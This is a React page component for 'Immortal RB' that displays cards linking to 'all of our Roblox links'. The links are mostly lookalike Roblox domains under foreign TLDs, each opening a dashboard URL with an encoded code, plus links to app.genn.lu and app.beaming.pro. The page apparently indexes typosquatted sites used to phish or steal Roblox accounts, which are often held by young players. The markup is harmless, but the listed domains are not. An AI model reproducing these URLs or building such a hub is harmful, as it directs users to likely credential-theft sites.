// app/page.tsx
"use client";

import React, { useEffect, useState } from 'react';

type SiteCard = {
  title: string;
  url: string;
  status: string;
  flag: string;
  isMore?: boolean;
};

export default function Home() {
  const [isMounted, setIsMounted] = useState(false);
  
  const sites: SiteCard[] = [
    {
      title: "roblox.com.gt",
      url: "https://roblox.com.gt/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "roblox.tg",
      url: "https://roblox.tg/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "roblox.is",
      url: "https://roblox.is/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "roblox.py",
      url: "https://roblox.com.py/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "App.genn.lu",
      url: "https://app.genn.lu/auth/mainslte",
      status: "Online",
      flag: "None",
      isMore: true
    },
    {
      title: "App.beaming.pro",
      url: "https://app.beaming.pro/u/SpIank",
      status: "Online",
      flag: "None",
      isMore: true
    }
  ];

  useEffect(() => {
    setIsMounted(true);
  }, []);

  return (
    <div className="min-h-screen bg-black p-4 sm:p-8">
      <div className="max-w-7xl mx-auto">
        {/* Animated header */}
        <header 
          className={`text-center mb-12 transition-all duration-700 transform ${
            isMounted ? 'opacity-100 translate-y-0' : 'opacity-0 -translate-y-6'
          }`}
        >
          <h1 className="text-4xl md:text-5xl font-bold mb-4 bg-gradient-to-r from-[#a7a3ff] to-[#5d9bff] bg-clip-text text-transparent">
            Sites Page
          </h1>
          <p className="text-[#e0e0ff] text-lg md:text-xl opacity-80">
            Use this page to view all of our 'Roblox' links
          </p>
        </header>

        {/* Cards grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
          {sites.map((site, index) => (
            <div 
              key={index}
              onClick={() => alert(site.title)}
              className={`
                rounded-2xl p-6
                bg-gray-800/30 border border-white/10
                backdrop-blur-lg backdrop-saturate-150
                transition-all duration-300
                cursor-pointer
                ${isMounted ? 'opacity-100 scale-100' : 'opacity-0 scale-95'}
                hover:shadow-lg hover:shadow-[#5d9bff]/20
                hover:-translate-y-2
              `}
              style={{
                animationDelay: isMounted ? `${index * 0.1}s` : '0s',
              }}
            >
              <div className="flex justify-between items-start mb-4">
                <h2 className="text-[#e0e0ff] text-xl font-bold">{site.title}</h2>
                {site.flag !== "None" && (
                  <span className="text-xl">{site.flag}</span>
                )}
              </div>
              
              <div className="flex justify-between items-center">
                <div className="flex items-center">
                  <div className="w-3 h-3 rounded-full bg-[#28c46b] mr-2"></div>
                  <span className="text-[#28c46b] text-sm bg-[#28c46b]/20 px-2 py-1 rounded-md">
                    {site.status}
                  </span>
                </div>
                <a 
                  href={site.url} 
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-[#5d9bff] hover:text-[#a7a3ff] text-sm font-medium transition-colors"
                  onClick={(e) => e.stopPropagation()}
                >
                  Dashboard
                </a>
              </div>
            </div>
          ))}
        </div>

        {/* Footer */}
        <footer className="mt-16 text-center text-[#e0e0ff]/60 text-sm">
          <p>© {new Date().getFullYear()} Immortal RB. All rights reserved.</p>
        </footer>
      </div>
    </div>
  );
}
